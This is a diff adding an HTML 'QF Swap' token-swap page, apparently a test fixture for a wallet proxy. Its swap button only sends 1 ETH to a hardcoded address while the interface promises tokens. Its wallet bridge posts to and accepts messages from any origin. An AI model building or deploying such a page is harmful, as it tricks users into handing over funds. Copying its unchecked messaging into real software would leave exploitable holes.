@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>QF Swap</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: #0a0e1a;
+      color: #e2e8f0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    .card {
+      background: #0f1729;
+      border: 1px solid rgba(6,182,212,0.3);
+      border-radius: 16px;
+      padding: 32px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 0 40px rgba(6,182,212,0.08);
+    }
+
+    h1 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #06b6d4;
+      margin-bottom: 4px;
+    }
+
+    .subtitle {
+      font-size: 0.85rem;
+      color: #94a3b8;
+      margin-bottom: 24px;
+    }
+
+    .swap-box {
+      background: #151f38;
+      border: 1px solid rgba(6,182,212,0.15);
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 16px;
+    }
+
+    .swap-label {
+      font-size: 0.75rem;
+      color: #64748b;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .swap-amount {
+      font-size: 2rem;
+      font-weight: 700;
+      color: #f1f5f9;
+    }
+
+    .swap-token {
+      font-size: 0.9rem;
+      color: #06b6d4;
+      margin-top: 4px;
+    }
+
+    .arrow {
+      text-align: center;
+      font-size: 1.2rem;
+      color: #475569;
+      margin: 8px 0;
+    }
+
+    .price-row {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.8rem;
+      color: #64748b;
+      margin: 12px 0 4px;
+    }
+
+    .price-row span:last-child {
+      color: #94a3b8;
+    }
+
+    #wallet-status {
+      font-size: 0.8rem;
+      color: #94a3b8;
+      margin-bottom: 16px;
+      min-height: 20px;
+    }
+
+    .wallet-address {
+      color: #06b6d4;
+      font-family: monospace;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.2s;
+    }
+
+    button:hover { opacity: 0.85; }
+    button:disabled { opacity: 0.4; cursor: not-allowed; }
+
+    #connect-btn {
+      background: rgba(6,182,212,0.15);
+      border: 1px solid rgba(6,182,212,0.4);
+      color: #06b6d4;
+      margin-bottom: 12px;
+    }
+
+    #swap-btn {
+      background: #06b6d4;
+      color: #0a0e1a;
+    }
+
+    #status-msg {
+      margin-top: 14px;
+      font-size: 0.8rem;
+      color: #94a3b8;
+      text-align: center;
+      min-height: 20px;
+      word-break: break-all;
+    }
+
+    #status-msg.success { color: #34d399; }
+    #status-msg.error   { color: #f87171; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>⚡ QF Swap</h1>
+    <p class="subtitle">Decentralized token swap on QF Network</p>
+
+    <div id="wallet-status">Not connected</div>
+
+    <div class="swap-box">
+      <div class="swap-label">You Pay</div>
+      <div class="swap-amount">1.0000</div>
+      <div class="swap-token">ETH</div>
+    </div>
+
+    <div class="arrow">↓</div>
+
+    <div class="swap-box">
+      <div class="swap-label">You Receive</div>
+      <div class="swap-amount">~2,450</div>
+      <div class="swap-token">QFT</div>
+    </div>
+
+    <div class="price-row">
+      <span>Rate</span>
+      <span>1 ETH = 2,450 QFT</span>
+    </div>
+    <div class="price-row">
+      <span>Network fee</span>
+      <span>~0.001 ETH</span>
+    </div>
+
+    <br>
+    <button id="connect-btn" onclick="connectWallet()">Connect Wallet</button>
+    <button id="swap-btn" onclick="swap()" disabled>Swap</button>
+
+    <div id="status-msg"></div>
+  </div>
+
+  <script>
+    var userAddress = null;
+    var RECIPIENT = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8'; // swap pool address
+
+    async function connectWallet() {
+      try {
+        setStatus('Connecting…', '');
+        var accounts = await requestWallet('eth_requestAccounts', []);
+        userAddress = accounts[0];
+        document.getElementById('wallet-status').innerHTML =
+          'Connected: <span class="wallet-address">' +
+          userAddress.slice(0, 6) + '…' + userAddress.slice(-4) + '</span>';
+        document.getElementById('swap-btn').disabled = false;
+        setStatus('Wallet connected. Ready to swap.', '');
+      } catch (err) {
+        setStatus('Connection failed: ' + err.message, 'error');
+      }
+    }
+
+    async function swap() {
+      if (!userAddress) { alert('Connect wallet first'); return; }
+
+      var btn = document.getElementById('swap-btn');
+      btn.disabled = true;
+      setStatus('Waiting for wallet confirmation…', '');
+
+      try {
+        // 1 ETH in hex wei
+        var ONE_ETH_HEX = '0xde0b6b3a7640000';
+
+        var txHash = await requestWallet('eth_sendTransaction', [{
+          from:  userAddress,
+          to:    RECIPIENT,
+          value: ONE_ETH_HEX
+        }]);
+
+        setStatus('Swap submitted! TX: ' + txHash, 'success');
+      } catch (err) {
+        setStatus('Swap failed: ' + err.message, 'error');
+      } finally {
+        btn.disabled = false;
+      }
+    }
+
+    function setStatus(msg, cls) {
+      var el = document.getElementById('status-msg');
+      el.textContent = msg;
+      el.className = cls || '';
+    }
+
+    // ── Wallet bridge ──────────────────────────────────────────────────────────
+    var _reqId = 0;
+    var _pending = {};
+
+    function requestWallet(method, params) {
+      return new Promise(function(resolve, reject) {
+        var id = ++_reqId;
+        _pending[id] = { resolve: resolve, reject: reject };
+
+        // Use injected window.ethereum if available (proxy injects it),
+        // otherwise fall back to raw postMessage for direct iframe loads.
+        if (window.ethereum) {
+          window.ethereum.request({ method: method, params: params || [] })
+            .then(function(r) { delete _pending[id]; resolve(r); })
+            .catch(function(e) { delete _pending[id]; reject(e); });
+          return;
+        }
+
+        window.parent.postMessage({
+          type:      'WALLET_REQUEST',
+          requestId: id,
+          method:    method,
+          params:    params || []
+        }, '*');
+
+        setTimeout(function() {
+          if (_pending[id]) {
+            delete _pending[id];
+            reject(new Error('Wallet request timed out'));
+          }
+        }, 60000);
+      });
+    }
+
+    window.addEventListener('message', function(event) {
+      var d = event.data;
+      if (!d || d.type !== 'WALLET_RESPONSE') return;
+      var req = _pending[d.requestId];
+      if (req) {
+        delete _pending[d.requestId];
+        d.error ? req.reject(new Error(d.error)) : req.resolve(d.result);
+      }
+    });
+
+    // Auto-connect if wallet already injected (after proxy loads)
+    window.addEventListener('ethereum#initialized', function() {
+      if (window.ethereum && window.ethereum.selectedAddress) {
+        connectWallet();
+      }
+    });
+  </script>
+</body>
+</html>
